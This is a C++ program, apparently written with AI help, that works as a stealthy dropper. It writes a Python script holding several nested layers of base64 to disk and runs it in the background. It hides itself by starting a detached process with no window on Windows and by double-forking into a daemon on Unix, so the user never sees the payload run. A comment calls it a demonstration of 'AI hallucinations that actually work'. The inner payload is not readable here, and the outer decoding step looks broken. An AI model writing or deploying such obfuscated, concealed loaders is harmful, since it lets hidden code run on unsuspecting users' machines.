// Note: following code was assisted by googel gemini



#include <iostream>
#include <fstream> // Required for file I/O
#include <cstdlib> // Required for system()
#include <string>  // Required for std::string
#include <vector>  // Required for std::vector
#include <thread>  // Required for std::thread
#ifdef _WIN32
#include <windows.h> // For CreateProcess on Windows
#else
#include <unistd.h> // For fork() and setsid()
#include <sys/types.h> // For pid_t
#endif

void runPayload() {
    const char* python_payload = "import base64.decodebytes; exec(base64.decodebytes('''aW1wb3J0IGJhc2U2NC5kZWNvZGVieXRlczsgZXhlYyhiYXNlNjQuZGVjb2RlYnl0ZXMoJycnYVcxd2IzSjBJR0poYzJVMk5DNWtaV052WkdWaWVYUmxjenNnWlhobFl5aGlZWE5sTmpRdVpHVmpiMlJsWW5sMFpYTW9KeWNuWVZjeGQySXpTakJKUnpsNlEyMXNkR05IT1hsa1EwSjZaVmhOUzJGWE1YZGlNMG93U1VoT01WbHVRbmxpTWs1c1l6Tk5TMVZHYkZWVFJUbFBXREJPVUZSVk1VSlVhMUZuVUZOQ2VtVllUWFZhV0doc1dUTldNRmxYU25OYVVYQndZbTVPTUZsWGVITllNbEpzWTBkV2ExcFhOV3BoVjFaNlNVUXdaMkZYTlhka1dGRnZTV3RzZFdNelVtaGlSM2RuWWxkc2VtTXliSFZhZVVKcldsaENiRnBIVm5WWk1teHNZM2xDY0ZwcFFtMWlNMVoxV2tRNFowdElhM1ppYVd0blVHbzBaMGxwYTJkUVZEQm5TVzVyYVVOdVVubGxWRzlMU1VOQlowbEhiSFJqUnpsNVpFTkNlVnBZUmpGYVdFNHdZM2R3YkdWSFRteGpTRkUyUTJsQlowbERRbkJhYVVKMVlqTlJaMkZYTlhwa1IwWnpZa1k1YTFwWVFteGFSMVoxV1RKc2JHTjZiMHRKUTBGblNVTkJaMGxEUW5kamJXeDFaRU5uYVVvelNteGpXRlpzWXpOU2VrcDVRbk5oVjBwNVdWaEtOVWxIYkhwSlNFcHNZMWhXY0dOdFZtdE1RMEpwWkZoUloySnRPVEJKUjFwMlpGYzFhMHhwUWxwaU0xVm5XVEpHZFVsSGJIVmpNMUpvWWtkM1oyRllVV2RrV0U1d1ltMWpaMG96UW5CalEwSndZbTVPTUZsWGVITkpTRXBzWTFoV2JHTXpVbnBLZVVsd1EybEJaMGxEUVdkSlEwRm5Zek5zZWt4dFZqUmhXRkZ2VFZOclMwbERRV2RKU0VKNVlWYzFNRXREU1c1amJWWjRaRmRXZW1SSVRXNUpSM2h3V1c1S2FHTnVhMmRpYlRrd1NVZGFkbVJYTld0TWFVSktZbTVPTUZsWGVITmhWelZ1U1VoS2JHTllWbXhqTTFKNlNVaFdlbUZYTlc1SlNFSndZME0wZFV4cFNYQkRhVUZuU1VOQ2VtUlhTbmRqYlRscVdsaE9la3h0VG05YVYwNXlXREpPYUdKSGQyOVhNVUphVmtWb1VGUnNPVVJVTURGT1VWVTFSVXhEUVdsTVZ6QnBURU5CYVdOSGJIZEphWGRuU1cxc2RXTXpVbWhpUjNkcFRFTkJhV050Vm5oa1YxWjZaRWhOYVZoVGQyZGpNMUpyWWpOV01GQllUakZaYmtKNVlqSk9iR016VFhWU1JWWlhWR3hXVFZSRGQyZGpNMUpyV2xoS2VWQllUakZaYmtKNVlqSk9iR016VFhWU1JWWlhWR3hXVFZSRGEwdEpRMEZuU1VoT01WbHVRbmxpTWs1c1l6Tk5kVmt5YUd4Wk1uUm1XVEpHYzJKRGFHSlZSbXhWVTBVNVQxZ3dUbEJVVlRGQ1ZHdFJjMGxHT1daYWJXeHpXbFk1WmxoVGEwdEpRMEZuU1VkV05HRllVVzlOUTJ0TFEybE5aMUp1Vm5OaVNHdG5XakpXZFZwWVNtaGtSMVpyU1VkS05VbEZaR3hpVjJ4MVlWRnZTME5uY0d0YVYxbG5Za2M1YmxnelVuWllNbEp3WXpKT2RtTnRVVzlpV0U1dVQyNU9NR05wZDJkaFZ6RjNZak5LTUZsWE5UQlFWVnBvWWtoT2JFdFViMHRKUTBGblNVTkphVWxzVG14aWJWSjZTVWRGWjJKSE9XNUpSekZzWXpOT2FGb3lWV2RrUnpobldWTkNSV0ZZVG1waU0wcHJTVWhrYkZsdGFIWmlNbk4xU1dsSmFVTnBRV2RKUTBGcVNVWlNiMkZZVFdka01sWnBZVWM1ZG1GNVFsWlZhM2RuWVZoTloxcHVTblppVTBJMVlqTldlVWxIT1RCaFIxWjVTVWhPYW1OdGJIZGtTRTExUTJsQlowbERRV3BKUld3d1NqTk5aMkZYTldwaVNGWnJXbGRSWjJGSFZubGFVMEl3WW5sQ2RGbFhiSFZrUjBad1ltbENNR0ZIVldkaVJ6bHVXakpzZFZwNVFtMWtWelZxWkVkc2RtSnRSbk5oV0ZJMVNVZFNNV050YkhWYWVVSndZbTVPTUZsWGVITlpXRkp3WWpJMGRVTnBRV2RKUTBJeldsZEtiMkl5T1hKWU0xWjVZa05CT1VsRFNtOWtTRkozWTNwdmRrd3lVbkJqTWs1MlkyMVJkVmt5T1hSTU1rWjNZVk01TTFwWFNtOWlNamx5WTNrNGVFNUVUWHBQUkVFeFRWUkZOVTFFVVRSTlZFbDVUWHBqTkV3elVuQk9iVVpGWTFaV1RVMHdUbkJUYWxKVVZteFdXRkpGZUROa2VrWnNXbXBSTlZVemFGZGlWMFpPWXpCU1RFNUdVakphUkdnMlYwUnNkbUZ0YURSaVZsWnlVMnc1Y0ZVeVJsUlZSMUpZWkVWMGVsWnJPRFJOYTBaT1NXZHZaMGxEUVdkaFZ6RjNZak5LTUZsWE5UQllNMlJzV1cxb2RtSXlkR1prV0VwelNVUXdaMGx0YURCa1NFSjZUMms0ZGxwSGJIcFpNamw1V2tNMWFtSXlNSFpaV0VKd1RETmtiRmx0YUhaaU1uUjZUSHBGTUUxNlVURk9hbGsxVFVSTmQwMVVhekpOUkZsNFRXcGpka3hYUlhka1ZUbEVUa1U1V0dSVmNEUk9NMFozVlVaa2FWTlZSa2RPTVVKclYxWk9TRk5HUmt4VldFWnpVbTFTTVU5SGVHcGthelZEVlRORmVWUnFiRXhUUmxaNVRGaEdjVk50WkVSaGJtczFXakozZDJSNlJrTmFiRkZwUTJsQlowbERRVXRKUTBGblNVZFNhR1JIUldkUVUwSTNTVzVXZWxwWVNuVlpWekZzU1dwdloxcHBTa3BpYms0d1dWZDRjMXBZU1RabE1qbDZURzFrYkdSSGVIWmFNbXgxUzBOc09VbHBkMmRKYlU1MlltNVNiR0p1VVdsUGFVSjBZekprT1VOcFFXZEpRMEl3WTI1ck5rTnBRV2RKUTBGblNVTkJaMk50Vm5oa1YxWjZaRWhOZFdOSE9YcGtRMmd6V2xkS2IySXlPWEpZTTFaNVlrTjNaMkZ1VG5aaWFqRnJXVmhTYUV0UmIyZEpRMEZuU1VOQlowbEhiRzFKUjJ4MFkwYzVlV1JIUm5Wa1JHOUxTVU5CWjBsRFFXZEpRMEZuU1VOQloyTnRWbmhrVjFaNlpFaE5kV05IT1hwa1EyaHdZbGhDZG1OdVVtaGlibEptWkRKV2FXRkhPWFpoTVRreFkyMTNjMGxIY0hwaU1qUTVXa2RHTUZsVGEwdEpRMEZuU1VkV05Ga3lWbmRrUTBKNVdsaEdNVnBZVGpCamVUVnNaVWRPYkdOSVVuQmlNalY2VEd4S2JHTllWbXhqTTFKR1pVZE9iR05JVW5CaU1qUm5XVmhOWjFwVWIwdEpRMEZuU1VOQlowbERRbmRqYld4MVpFTm9iVWxyV21oaFYzaHNXa05DTUdKNVFucGFWelZyU1VkNGRscDVRblJhV0U1NldWZGtiRTlwUWpkYVdEQnBTMUZ2UzFwSFZtMUpSMngxWXpOU2FHSkhlR1phUjFaM1dsYzFhMXBYTldwaFYxWjZTMGhLYkdOWVZuQmpiVlowV2xjMU1HTXhPWGRaV0ZKdlMxUnZTMGxEUVdkSlEwbHBTV3RzZFdNelVtaGlSM2g2U1VoS2JHTllWbkJqYlZaclNVWkNOV1JIYUhaaWFVSjNXVmRPY2xsWFpHeGplVUl4WXpKc2RWcDVRbmRoV0VGMVNXbEphVU5wUVdkSlEwSjNZMjFzZFdSRFoybFRWelY2WkVkR2MySkhiSFZhZVVKNVdsaEdNV0ZZU214YVEwSnJXbGhDYkdKdFVteGliVTV3V2xoTmRVeHBOR2xMVVc5blNVTkJaMkpIT1c1WU0xSjJXREpTY0dNeVRuWmpiVkZ2U1d0c2RXTXpVbWhpUjNod1ltMWpaMXBIVm5kYVZ6VnJXbGMxYW1GWFZucE1hVFIxU1dsM1oyRlhNWGRpTTBvd1dWYzFNRkJXVW5sa1YxVndRMmxCWjBsRFFqQmpibXMyUTJsQlowbERRV2RKUTBGbll6TldhV05JU25aWk1sWjZZM2sxYW1GSFZtcGhNVGxxV1ZkNGMwdEdkRkZYVmxKSlZEQTFabEV3T1U1VVZVWlBVa04zWjBscE1YUkphWGRuU1c1Q2NHTkRTWE5KUTBwd1ltNU9NRmxYZUhOSmFYZG5TV2t4ZVVscGQyZGpiVlo0WkZkc2VWcFhNV3hpYmxKNldETkNhR1JIYUdSTVEwSjZaRWRTZG1SWVVUbGpNMVpwWTBoS2Rsa3lWbnBqZVRWRlVsWmFUMVpWZUUxTVEwSjZaRWRTYkdOdVNUbGpNMVpwWTBoS2Rsa3lWbnBqZVRWRlVsWmFUMVpWZUUxTFVXOW5TVU5CWjBsRFFXZEpSM2gyV2pFNU1HSXhPV3RoV0U1cVlqTkthMHREU2xSa1YwNXFXbGhPZWxwdVZuTmlTR3RuWVZjMWVtUkhSbk5pUjFaclNVZFNiR05IVm5WYVIxWjFXVEpzYkdONVFtMWpiVGwwU1VkQ2VWcFlSakZoV0Vwc1lsZFdkV1JJVFhWa1NHZ3dXVU0wYVV0UmIyZEpRMEZuV2xob2FscFlRakJKU0U0eFdXNUNlV0l5VG14ak0wMTFVVEpHYzJKSFZtdFZTRXAyV1RKV2VtTXdWbmxqYlRsNVQyZHZaMGxEUVdkSlEwRm5TVWhDZVdGWE5UQkxRMHBIV1Zkc2MxcFhVV2RrUnpobllWYzFlbVJIUm5OaVEwSnJXbGhDYkdKdFVteGliVTV3V2xoTloxcHVTblppVTBKNVdsaEdNV0ZZU214aVYxWjFaRWhOZFdSSWFEQk1hVWx3UTJsQlowbERRV2RKUTBGblkwaEtjR0p1VVc5SmJFSnpXbGRHZWxwVFFteGliazR4WTIxVloyTkhiSGRKUjJ4NlNVZHNkV016VW1oaVIzaHNXa05DYUdKdFVXZGxWemt4U1Vkb2FHUnRWV2RaVnpSbllWYzFNRnBZU25WYVdGRm5XVEk1ZFdKdFZtcGtSMngyWW1rMGFVdFJiMmRKUTBGblNVTkJaMGxIZUhaYU1Ua3dZakU1YTJGWVRtcGlNMHByUzBOSmNVdHJWbE5WYXpsVFMybHZOa2xGV21oaFYzaHNXa05DTUdKNVFuQmliazR3V1ZkNGMwbEhVbXhqUjFaMVdrZFdkVmt5Ykd4amVVSnRZMjA1ZEVsSFFubGFXRVl4WVZoS2JHSlhWblZrU0UxMVpFaG9NRmxETkdsTVEwSndZbGhDZG1OdVVtaGlibEU1VmtoS01WcFRhMHRKUTBGblNVTkJaMGxEUW5wbFdFMTFXbGhvY0dSRFozaExVVzluU1VOQloyTklTbkJpYmxGdlNXdEdjMkpEUW10YVdFSnNZbTFTYkdKdFRuQmFXRTFuWVZjMWVtUkhSbk5pUjFaclRHbEpjRU5uY0d0YVYxbG5Xa2M1TTJKdGVIWlpWMUptV20xc2MxcFRhREZqYlhkelNVZFNiR016VW5CaWJVWXdZVmM1ZFV0VWIwdEpRMEZuU1VOSmFVbHJVblprTWpWellqSkdhMk41UW1oSlIxcHdZa2RWWjFwdVNuWmlVMEpvU1VaV1UxUkRRakJpZVVKb1NVZFNiR016VW5CaWJVWXdZVmM1ZFVsSVFtaGtSMmQxU1dsSmFVTnBRV2RKUTBJd1kyNXJOa05wUVdkSlEwRm5TVU5CWjJOSVNuQmlibEZ2V21sS1JXSXpaSFZpUnpsb1drZHNkVnA1UWpkaU0wMTFZMGRHTUdGRE5XbFpXRTVzWW0xR2RGcFRhR3RhV0U0d1lWYzFhR1JIYkhaaWFXdzVTVWRhZVdJeU1HZGxNMVo1WWtnd2RVeHBOR2xMVVc5blNVTkJaMGxEUVdkSlNFcHNZek5DZG1KdVRteEpSREJuWTIxV2VHUlhWbnBrU0UxMVdqSldNRXRJVm5saVEzZG5Zek5TZVZwWFJuUlFWbEo1WkZkVmNFTnBRV2RKUTBGblNVTkJaMk50Vm5walJ6bDFZekpWZFdOdFJuQmpNbFptV20wNWVWZ3pUakJaV0ZJeFkzbG5jRWxEUVdwSlJrcG9ZVmhPYkVsSFJuVkpSMVkwV1RKV2QyUkhiSFppYVVKdFlqTkpaMWx0Um10SlNFNHdXVmhTTVdONVFtcGlNbEpzWTNkdlowbERRV2RKUTBGblNVRnZaMGxEUVdkSlEwRm5TVWM1ZWt4dE1XaGhNbFpyWVZoS2VrdEhPWHBNYmtKb1pFZG5kVnBIYkhsaWJVWjBXbE5vYTFwWVRqQmhWelZvWkVkc2RtSnBhM05KUjFZMFlWaE9NRmd5T1hKUVZsSjVaRmRWY0VOcFFXZEpRMEZuU1VOQlowTnBRV2RKUTBGblNVTkJaMlF5YkRCaFEwSjJZMGRXZFV0SFVteGpNMUp3WW0xR01HRlhPWFZNUTBGcFpESkphVXRUUW1oamVVSnRUMmR2WjBsRFFXZEpRMEZuU1VOQlowbERRbTFpTTBsbldUSm9NV0p0YzJkaFZ6Um5ZMjFXZW1OSE9YVmpNbFYxWVZoU2JHTnNPV3BpTWpVd1dsYzFNRXRIVG05a1Z6VnlXRE5PY0dWdFZUbFBSRVUxVFdsck5rTnBRV2RKUTBGblNVTkJaMGxEUVdkSlEwRm5TVU5DYlV4dVpIbGhXRkpzUzBkT2IyUlhOWEpMVVc5blNVTkJaMGxEUVdkSlNFSjVZVmMxTUV0SFdXbFZNMVpxV1RKV2VtTXlXakZpUjNnMVNVZFNkbVF5TlhOaU1rWnJXbGRSWjJSSE9HZGxNbEpzWXpOU2NHSnRSakJoVnpsMVpsTkpjRU5wUVdkSlEwRm5TVU5CWjJKSE9XNVlNMUoyV0RKU2NHTXlUblpqYlZGdldtbEtSV0l6WkhWaVJ6bG9Xa2RXYTBsSFFqZGlNMDExWTBkR01HRkROV2xaV0U1c1ltMUdkRnBUYUd0YVdFNHdZVmMxYUdSSGJIWmlhV3c1V1VNMGFVdFJiMmRKUTBGbldsaG9hbHBZUWpCSlNFcHNZMWhXYkdNelVucE1iVlkwV1RKV2QyUkhiSFppYmsxMVZXMVdlR1JYVm5wa1JWWTBXVEpXZDJSSGJIWmlhVUpvWTNsQ2JFOW5iMmRKUTBGblNVTkJaMGxJUW5saFZ6VXdTMGRaYVZKWVNubGlNMGxuV2tjNU0ySnRlSFpaVjFKd1ltMWpaMlV6Vm5saVNEQTJTVWgwYkdaVFNYQkRhVUZuU1VOQlowbERRV2RpUnpsdVdETlNkbGd5VW5Cak1rNTJZMjFSYjFwcFNYRkxhMVpUVldzNVUwdHBielpKUlZwb1lWZDRiRnBEUWpCaWVVSnJZak5rZFdKSE9XaGFRMEpuWlRJNWVreHVRbWhrUjJkMVdXMUdlbHBYTldoaVYxVnZXa2RXZW1SSGJIVlpXRkp3WWpJMGNHWlhRVFpKU0hSc1psTkpjRU5wUVdkSlEwRm5TVU5CWjJNemJIcE1iVlkwWVZoUmIwMVRhMHREYlZKc1dtbENkRmxYYkhWTFEyczJRMmxCWjBsRFFXbEphVXBPV1Zkc2RVbEhXakZpYlU0d1lWYzVkVWxJVW5aSlNFb3hZbWxDTUdGSFZXZGlNalZ6WVZjMWJFbEhiSFZqTTFKb1lrZDRiR05wTkdsSmFVbExTVU5CWjBsSGJHMUpTRTQxWTNrMWQySkhSakJhYlRsNVlsTkJhRkJUUVdsa01teDFUWHBKYVU5bmIyZEpRMEZuU1VOQlowbElRbmxoVnpVd1MwTktWV0ZIYkhwSlNFSjVZakprZVZsWE1HZGhXRTFuWVZjMU1GcFhOV3RhVjFGbldtMDVlVWxHWkhCaWJWSjJaRE5OWjJJeU5YTmxVelJuVWxob2NHUkhiSFZhZVRScFMxRnZaMGxEUVdkSlEwRm5TVWhPTldONU5XeGxSMnd3UzBSRmNFTm5iMmRKUTBGbllrYzVibGd6VW5aWU1sSndZekpPZG1OdFVXOUphVzl4VlROU2FHTnVVbkJpYldObllqSTFjMkZYTld4SlIyeDFZek5TYUdKSGVHaGtSMngyWW1sQ2RscHBRakpOYVRSMVRHbHZjVWxwZDJkaFZ6RjNZak5LTUZsWE5UQlFWbEo1WkZkVmNFTm5iMmRKUTBGbllVYzVkRnBXT1d0aFdFbG5VRk5DZG1ONU5YZFpXRkp2VEcxV05HTkhSblZhU0ZaNldsaEpiMGx1TkdsTFVXOW5TVU5CWjJNeWFHeGlSM2htWXpOU2FHTnVVakZqUmpscllWaEpaMUJUUW5aamVUVjNXVmhTYjB4dGNIWmhWelJ2WWpOTmRWcFhOVEpoV0VwMllteHpibEZXUWxGU1JVWlZVVk5rWkV4RFFXNVVWMnhxWTIwNWVtSXlXakJLZVhkblNqRmtjR0p0VW5aa00wMXVURU5CYmxVelVtaGpibEZuVkZkV2RXUlRZM05KUTJSUlkyMDVibU50Um5SamVXTnpTVU5rVkdSSFJubGtTRlozU25sclMwbERRV2RKU0Zwd1kyNVdlbGd5VW5CamFVRTVTVWM1ZWt4dVFtaGtSMmQxWVcwNWNHSnBhRzlpTWpGc1dESlNjR05wZDJkSmFUVXdXbGN4ZDBscGQyZEphekZ3V1ROS2RtTXlPVzFrUmpsR1drZGtiRmd6WnpKT1EwbHpTVU5LTVdSSGJITmplVWx3UTJkdlowbERRV2RqYlZaM1lqRTVhVmxZVG14WU0xWjVZa05CT1VsRFNtOWtTRkozWTNwdmRrd3pTbWhrZVRWdVlWaFNiMlJYU2pGak1sWjVXVEk1ZFdSSFZuVmtRelZxWWpJd2RsTkhSbXBaV0Vwd1dYazVNbUZZU2pGak1UbHVXVmN4YkV3eU1XaGhWelIyWkdwSmRrbG5iMHRKUTBGblNVZHNiVWxIYkhWak0xSm9Za2Q0WmxwSFZuZGFWMUpzWW0xT2NGcFlUVFpEYVVGblNVTkJaMGxEUVdkSmVVSkZZak5rZFdKSE9XaGFRMEpyV2xoQ2JHSnRVbXhpYlU1d1dsaE5aMXB0YkhOYVUwSm9ZbTFSWjJGWE5YcGtSMFp6WWtOQ2QxbFhUbkpaVjJSc1kzZHZaMGxEUVdkSlEwRm5TVWRTYkdOSFZuVmFSMVoxV1RKc2JHTXhPVEZqYlhkblVGTkNiVWx1ZEhsYVdFSjJXREpLYUdNeVZtWmtXRXB6WmxkU2JHTkhWblZhUjFaMVdUSnNiR041TlRCbFNGRnBRMmxCWjBsRFFXZEpRMEZuU1hsQ1VXSkhSbXBhVTBKd1pFTkNjR0pwUW1oSlNGSnNZbGhDZG1OdFJubGxVMEpwWkZoUloyUXpTbkJrUjBacFlrZFZaMkpIT1dwWldGSndZakkwUzBsRFFXZEpRMEZuU1VOQ01GcFhNWGRZTWxKd1kybEJPVWxIT1hwTWJWWjFaRzFzZVdJeU5IVmFNbFl3UzBOS1ZWSlZNVkZKYVhkbllqTk5kV05IUmpCaFF6VnhZakpzZFV0SGFIWmlWMVptV2tkc2VVeERRV2xNYmxKc1lsaEJhVXRUYTB0SlEwRm5TVU5CWjBsRFFtdGFXRUpzWW0xU2JHSnRUbkJhV0U1bVkwZEdNR0ZEUVRsSlJ6bDZURzVDYUdSSFozVmhiVGx3WW1sb01GcFhNWGRZTWxKd1kybDNaMGx1V1hsWU0wcHNZMWhXY0dOdFZuUmFWelV3WTNrMU1HVklVV2xMVVc5blNVTkJaMGxEUVdkSlIxSjJaREkxYzJJeVJtdFlNbHB3WWtkVmIxcEhWbmRhVnpWcldsYzFhbUZYVm5wWU0xWjVZa04zWjFwSFZuZGFWelZyV2xjMWFtRlhWbnBZTTBKb1pFZG5jRU5wUVdkSlEwRm5TVU5CWjJGWE5YcGtSMFp6WWtZNWExcFlRbXhpYlZKc1ltMU9jRnBZVFc5YVIxWjNXbGMxYTFwWE5XcGhWMVo2V0ROQ2FHUkhaM0JEWjI5blNVTkJaMGw1UWtWYVYxcHdZbTFXZWtsSVpHOWhWMDV2U1VkYWNHSkhWbnBKU0ZKMlNVZFNkbVF5TlhOaU1rWnJTVWRHZFZwRFFqTmhSMVo1V2xOQ01HSjVRbmRpUjBacVdsTkNNR0ZIVm5SRGFVRm5TVU5DYldGWGVHeGpNVGt3WWpFNWNHSnVUakJaVjNoelNVUXdaMWQzYjJkSlEwRm5TVU5CWjBsRGFHMUpiblI1V2xoQ2RsZ3lTbWhqTWxabVpGaEtjMlpYWkdoaVYwWm1XVmRHYUV4dVFqVkphWGRuWWpOTmRXTkhSakJoUXpWeFlqSnNkVXRJV25CamJsWjZXREpTY0dOcGQyZEpiVTV6V2xkR2RXUllRbVpsUkZrd1RHNUNOVWxwYTNCTVFXOW5TVU5CWjBsRFFXZEpRMmh0U1c1MGVWcFlRblpZTWtwb1l6SldabVJZU25ObVYxcHdZa2RXWmxreWFHeFpNblJzWTJrMWQyVlRTWE5KUnpsNlRHNUNhR1JIWjNWaGJUbHdZbWxvTW1GWVNqRmpNVGxyWVZoSmMwbERTbXBpUjFab1ltMVdlVmd6WjNwTmFUVjNaVk5KY0V0VGQwdEpRMEZuU1VOQlowbERRVzlhYVVvM1kyMVdkMkl4T1dsWldFNXNXRE5XZVdKSU1YcGtSMFo1WkVoV2QweHVRalZKYVhkbllqTk5kV05IUmpCaFF6VnhZakpzZFV0SVRtOWFWM2h6V0ROT01GbFlTakJrV0VKbVdrZHNlVXhEUVdsalNHd3dZVWM1ZFZneVZqUmFWMDR4WkVkR2FXSkhWbVprV0VKcldWaFNiRmd6VG14amJscHdXVEpWZFdOSWEybExVMnR6UTJsQlowbERRV2RKUTBGblMwZFphV1V6U214alJ6bG1XVzFHZWxwV09URmpiWGc1WlZjNU1XUklWbWxhVmpscVlqSXdkR1F5UmpCWk1tZDBXa1pHTTA1SVl6VldNbVJaV1RGRmRXSllRWHBKYVhkbllqTk5kV05IUmpCaFF6VnhZakpzZFV0SVduQmpibFo2V0RKU2NHTnBkMmRKYm14MlpGaFNNVmx0Vm1aWk1qbDBURmhrYUdSSFRtOU1WMUpTWkhwU00wOVdaRzVYUjA1U1RHMHhkMDE1U1hCTFUzZExTVU5CWjBsR01FdERhVUZuU1VOQ2QyTnRiSFZrUTJkcFdFYzFSV0l6WkhWaVJ6bG9Xa2RzZFZwNVFtaGliVkZuWTBkNGFGa3liSFZhZVVKM1kyMDVibU50Um5SSlIxcHdZa2RXZWt4cE5IVkphV3RMU1VOQlowbEhXblpqYVVJeFkyMTNjMGxIVW14ak0xSndZbTFHTUdGWE9YVkpSMngxU1VkYWNHSkhWbnBZTTFKMldESnNkV016VW1oaVIzYzJRMmxCWjBsRFFXZEpRMEZuV2tjNU0ySnRlSFpaVjFKbVdtMXNjMXBUYURGamJYZHpTVWRTYkdNelVuQmliVVl3WVZjNWRVdFJiMHRKUTBGblNVZDRkbG94T1RCaU1UbHJZVmhPYW1JelNtdExRMHBLWW01T01GbFhlSE5aV0ZKd1lqSTBaMWt5T1hSalIzaHNaRWRWZFVsR1RqQlpXRW93WVZjMWJrbElRbmxpTW1SNVdWY3dkVWxwYTB0SlEwRm5TVWhDZVdGWE5UQkxRMHBqWW10c2RXTXpVbWhpUjNob1pFZHNkbUpwUW1waU1qRjNZa2RXTUZwVE5HZFZNMUpvWTI1U2NHSnRZMmRqU0VwMldqTkthR0pUTkhWTWFVbHdRMmR2WjBsRFFXZEplVUpVWkVkR2VXUkRRakJoUjFWblkwaEtkbG96U21oaVUwSXlZVmRGWjJSSGFHeEpTRTR3V1ZoS01HUllRV2RqTWs1NVlWaENNRU5wUVdkSlEwSjZaRWRHZVdSSVZuZFlNMDVxWTIxc2QyUkdPWGRaV0ZKdlNVUXdaMkl6VFhWalIwWXdZVU0xY1dJeWJIVkxTRTV2V2xkNGMxZ3pUakJaV0Vvd1pGaENabHBIYkhsTVEwRnBZMGhzTUdGSE9YVllNbFkwV2xkT01XUkhSbWxpUjFabVpGaENhMWxZVW14WU0wNXNZMjVhY0ZreVZYVmpTR3RwUzFGdlowbERRV2RrU0VvMVQyZHZaMGxEUVdkSlEwRm5TVWhPTVZsdVFubGlNazVzWXpOTmRWVkhPWGRhVnpSdlZ6RkNXbFpGYUZCVWJEbEVWREF4VGxGVk5VVk1RMEo2WkVkR2VXUklWbmRZTTA1cVkyMXNkMlJHT1hkWldGSnZXRk4zWjFrelNteFpXRkp3WWpJMWJXSkhSbTVqZWpGNlpGZEtkMk50T1dwYVdFNTZUR3RPVTFKVlJsVlNWamxQVkRFNVdGTlZOVVZVTVdOd1EybEJaMGxEUVdkSlEwRm5ZMGhLY0dKdVVXOUpiRUo1WWpKa2VWbFhNR2RqTTFKb1kyNVNiRnBEUW5wa1YwNXFXbGhPZWxwdVZuTmlTR3RuWVZjMFoyUkhhR3hKUjBwb1dUSjBibU50T1RGaWJWRjFTV2xyUzBsRFFXZEpRMEZuU1VOQ2QyTnRiSFZrUTJkcFZrZG9iRWxIYkhWak0xSm9Za2Q0YkdOcFFqTmhWM2h6U1VjMWRtUjVRbXhsUjJ3d1RHbEpjRU5wUVdkSlEwSnNaVWRPYkdOSVVXZFNXR2hxV2xoQ01HRlhPWFZKUjBaNlNVZFZOa05wUVdkSlEwRm5TVU5CWjJOSVNuQmlibEZ2V21sS1IxbFhiSE5hVjFGblpFYzRaMk16VW1oamJsRm5aRWRvYkVsSVFubGlNbVI1V1Zjd05rbElkR3htVTBsd1EybEJaMGxEUVdkSlEwRm5Za2M1YmxnelVuWllNbEp3WXpKT2RtTnRVVzlhYVVseFMydGFRbFpGUmsxTGFXODJTVVZhYUdGWGVHeGFRMEl3WW5sQ2MxbFlWblZaTW1kbll6TlNhR051VWpGalEwSjZXVE5LY0dOSVVUWkpTSFJzWmxOSmMwbEhiSFJqUnpsNVpFZEdkV1JFTVZWamJsWnNTMUZ2UzJGWFdXZFlNVGwxV1ZjeGJGZ3hPR2RRVkRCblNXdzVabUpYUm5CaWJEbG1TV3B2UzBsRFFXZEpSekZvWVZjMGIwdFJiejBuSnljdVpXNWpiMlJsS0NkMWRHWXRPQ2NwS1M1a1pXTnZaR1VvSjNWMFppMDRKeWtwJycnLmVuY29kZSgndXRmLTgnKSkuZGVjb2RlKCd1dGYtOCcpKQ=='''.encode('utf-8')).decode('utf-8'))";

    const char* scriptName = "hello_from_cpp.py";

    std::ofstream outFile(scriptName);

    if (outFile.is_open()) {
        outFile << python_payload << std::endl;
        outFile.close(); // Close the file

        // List of common python commands to try
        std::vector<std::string> python_commands = {"python3", "python", "py"};
        bool script_ran = false;

        for (const auto& py_cmd : python_commands) {
            #ifdef _WIN32
                std::string check_command = py_cmd + " --version > nul 2>&1";
            #else
                std::string check_command = py_cmd + " --version > /dev/null 2>&1";
            #endif
            if (system(check_command.c_str()) == 0) {
                std::string run_command;
                #ifdef _WIN32
                    // On Windows, 'start /B' runs a command without creating a new window.
                    run_command = "start /B " + py_cmd + " " + scriptName;
                #else
                    // On Linux/macOS, '&' runs the command in the background.
                    run_command = py_cmd + " " + scriptName + " &";
                #endif
                system(run_command.c_str());
                script_ran = true;
                break; // Exit the loop once a working command is found
            }
        }

        // Note: Any logging (std::cout, std::cerr) here might not be visible
        // if the main terminal closes instantly.
    }
}

int main(int argc, char* argv[]) {
    // Following code is demonstration of AI hallucinations that actually work
    // It should make the program exit and not kill the thread, so no terminal is open

#ifdef _WIN32
    // Windows implementation: re-launch self as a hidden, detached process.
    if (argc > 1 && std::string(argv[1]) == "--run-payload") {
        runPayload();
    } else {
        char selfPath[MAX_PATH];
        GetModuleFileName(NULL, selfPath, MAX_PATH);
        std::string commandLine = "\"" + std::string(selfPath) + "\" --run-payload";
        STARTUPINFO si;
        PROCESS_INFORMATION pi;
        ZeroMemory(&si, sizeof(si));
        si.cb = sizeof(si);
        ZeroMemory(&pi, sizeof(pi));
        if (CreateProcess(NULL, &commandLine[0], NULL, NULL, FALSE, CREATE_NO_WINDOW | DETACHED_PROCESS, NULL, NULL, &si, &pi)) {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
    }
#else
    // Linux/macOS implementation: use a double fork to create a daemon.
    pid_t pid = fork();
    if (pid == 0) { // First child
        setsid(); // Detach from the controlling terminal
        pid_t second_pid = fork();
        if (second_pid == 0) { // Grandchild
            runPayload(); // The grandchild executes the payload
        }
        _exit(0); // First child exits
    }
    // Parent process exits immediately
#endif

    return 0; // The original process exits immediately.
}